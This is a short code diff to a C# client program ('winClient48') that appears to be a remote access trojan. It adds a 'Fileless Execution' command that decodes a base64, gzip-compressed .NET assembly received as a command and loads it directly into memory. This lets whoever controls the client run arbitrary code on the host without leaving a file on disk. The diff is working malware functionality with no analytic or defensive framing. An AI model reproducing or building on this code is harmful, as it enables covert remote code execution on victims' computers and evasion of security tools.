@@ -41,6 +41,7 @@ using System.Net;
 using System.Net.Sockets;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
@@ -2115,6 +2116,18 @@ namespace winClient48
                     {
 
                     }
+                }
+
+                #endregion
+                #region Fileless Execution
+
+                else if (cmd[0] == "fle") //Fileless Execution
+                {
+                    string[] alpArgs = cmd[1].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
+                    byte[] abAssembly = Convert.FromBase64String(cmd[2]);
+                    abAssembly = clsEZData.abGzipDecompress(abAssembly);
+
+                    installer.fnLoadToMemory(alpArgs, abAssembly);
                 }
 
                 #endregion
